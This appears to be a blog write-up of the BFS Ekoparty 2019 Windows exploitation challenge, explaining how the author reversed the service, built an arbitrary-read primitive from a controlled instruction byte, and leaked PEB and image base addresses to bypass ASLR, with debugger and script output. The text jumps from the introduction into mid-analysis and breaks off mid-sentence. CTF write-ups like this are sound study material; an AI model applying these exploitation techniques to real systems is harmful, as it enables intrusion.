=== Content from www.zer0-day.pw_719c770f_20250121_025028.html ===


[0DAY](https://www.zer0-day.pw "0DAY (Alt + H)")

* [Home](https://www.zer0-day.pw/ "Home")
* [Advisories](https://www.zer0-day.pw/advisories/ "Advisories")
* [Blog](https://www.zer0-day.pw/blog/ "Blog")
* [Archives](https://www.zer0-day.pw/archives/ "Archives")
* [Search](https://www.zer0-day.pw/search/ "Search (Alt + /)")

[Home](https://www.zer0-day.pw) » [Blog](https://www.zer0-day.pw/blog/)
# BFS Ekoparty 2019 Exploitation Challenge

April 30, 2020 · 10 min · dhn

Table of Contents

* [0x01: Introduction](#0x01-introduction)
* [0x02: Reversing the service](#0x02-reversing-the-service)
* [0x03: Exploitation](#0x03-exploitation)
  + [Bypass ASLR](#bypass-aslr)
  + [Code Execution](#code-execution)
  + [Stack pivot & ROP chain](#stack-pivot--rop-chain)
* [0x04: Proof-of-Concept (PoC)](#0x04-proof-of-concept-poc)
* [0x05: Final thought](#0x05-final-thought)
* [0x06: Resources](#0x06-resources)

**TL;DR**: In this blog, I’ll explain my approach to solve the BFS exploitation
challenge **[1]**. The challenge was published by BFS to win a ticket for the
BFS-IOACTIVE party during the Ekoparty conference. The exploit was developed on
Windows 10 x64 1909.

## 0x01: Introduction[#](#0x01-introduction)

A while ago I’ve seen this challenge published by BFS. The aim of this challenge
was to bypass Address Space Layout Randomization (**ASLR**) remotely, get code

00007ff6`0f18e580  c3c3c3c3 0c488b01 c3c3c3c3 0d488b01
00007ff6`0f18e590  c3c3c3c3 0e488b01 c3c3c3c3 0f488b01

```

Before the function will executed, the instruction
`mov rcx,qword ptr [rcx+rax*8]` changed the `RCX` register to
`0x3e488b01c3c3c3c3`. The function at `eko2019+0x1170` will invert these
values to little endian. As a result, `0x3e488b01c3c3c3c3` become to
`0xc3c3c3c3018b483e`.

This value will be used in `WriteProcessMemory()` as `lpBuffer` and copied
the returned value of `eko2019+0x1170` to the function `eko2019+0x1000`.
The previously mentioned value will be interpreted as an assembler instruction
in `eko2019+0x1000`:

```
+3:12% rasm2 -d 0x3e488b01c3c3c3c3 -b 64
mov rax, qword ds:[rcx]
ret
ret
ret
ret

```

The listing below shows the function before `eko2019+0x1170` was executed and
`WriteProcessMemory()` has overwritten the first 8-bytes:

```
0:003> u eko2019+0x1000
00007ff6`0f181000 48894c2408      mov     qword ptr [rsp+8],rcx
00007ff6`0f181005 90              nop
00007ff6`0f181006 90              nop
00007ff6`0f181007 90              nop
00007ff6`0f181008 90              nop
00007ff6`0f181009 90              nop
00007ff6`0f18100a 90              nop
00007ff6`0f18100b 90              nop

```

The returned value of `eko2019+0x1170` will be stored in `RAX` afterward.
When the function at `eko2019+0x1000` is called after the
`WriteProcessMemory()` method, the returned value will land and execute in
`eko2019+0x1000`, as seen below:

```
0:003> u eko2019+0x1000
00007ff6`0f181000 3e488b01        mov     rax,qword ptr ds:[rcx]
00007ff6`0f181004 c3              ret
00007ff6`0f181005 c3              ret
00007ff6`0f181006 c3              ret
00007ff6`0f181007 c3              ret
00007ff6`0f181008 90              nop
00007ff6`0f181009 90              nop
00007ff6`0f18100a 90              nop

```

After the execution of the 8-bytes, the value containing in `RAX` is sent back
in the socket. Luckily, we are able to control the `RCX` and `RAX` registers
by sending more than `0x201` bytes rather than `0x200`. We are able to
control only one byte of the `RAX` register, in the example above `0x3e`,
which provides a limitation of instructions. Later, we will see that this one
byte is enough to achieve code execution.

## 0x03: Exploitation[#](#0x03-exploitation)

As we know from the reversing session, we are able to control the `RAX` and
`RCX` register. This means we can change both, the code execution via the
`RAX` register and its argument with the `RCX` register. If we only change
the `RCX` register it provides us an arbitrary read. This is a very strong
primitive.

### Bypass ASLR[#](#bypass-aslr)

**ASLR** can be easily bypassed by using the arbitrary read primitive. The
problem is to find a suitable memory address that we can read. In Windows 64-bit
we are able to get the address of Process Environment Block (**PEB**) with the
special `GS` register. By providing the accurate offset, `GS` can point to
the **PEB** with the offset `0x60`.

```
0:000> dt nt!_TEB
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x038 EnvironmentPointer : Ptr64 Void
   +0x040 ClientId         : _CLIENT_ID
   +0x050 ActiveRpcHandle  : Ptr64 Void
   +0x058 ThreadLocalStoragePointer : Ptr64 Void
   +0x060 ProcessEnvironmentBlock : Ptr64 _PEB
   [...]

```

We can set the `RAX` register to `0x65` and the `RCX` register to
`0x60`[1](#fn:1) in order to get the following instruction:

```
+9:18% rasm2 -d 0x65488b01c3c3c3c3 -b 64
mov rax, qword gs:[rcx]
ret
ret
ret
ret

```

The value of `RAX` is sent back in the socket and leaked the address of
**PEB**. In the next step, this address can be used to leak the Image Base
Address of `eko2019.exe`. This can be achieved by adding `0x10` bytes to the
leaked **PEB** address:

```
0:000> dt nt!_PEB
ntdll!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 BitField         : UChar
   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
   +0x003 IsProtectedProcess : Pos 1, 1 Bit
   +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit
   +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit
   +0x003 IsPackagedProcess : Pos 4, 1 Bit
   +0x003 IsAppContainer   : Pos 5, 1 Bit
   +0x003 IsProtectedProcessLight : Pos 6, 1 Bit
   +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit
   +0x004 Padding0         : [4] UChar
   +0x008 Mutant           : Ptr64 Void
   +0x010 ImageBaseAddress : Ptr64 Void
   [...]

```

Putting all together allows us to defeat **ASLR**:

```
+11:30% ./exploit-bypass_ASLR.py
[+] Leaked PEB address: 0x260000
[+] Leaked 'eko2019.exe' image base address: 0x7ff60f180000

```

To verify that the base address of `eko2019` is correct we can look into
**WinDBG**:

```
0:001> lm m eko2019
start             end                 module name
00007ff6`0f180000 00007ff6`0f192000   eko2019  C (no symbols)

```

With this approach, we can also read the StackBased address at offset
`0x08`[2](#fn:2), which gives us a pointer to the stack. With the stack base
address, we are able to read the whole binary memory space as well as the
current thread stack.

### Code Execution[#](#code-execution)

Now, that we are able to leak the image base address of `eko2019` and bypass
**ASLR** we would like to gain code execution. In place of changing the `RAX`
register to a prefix to read arbitrary data, we can change it to a 1-byte[3](#fn:3)
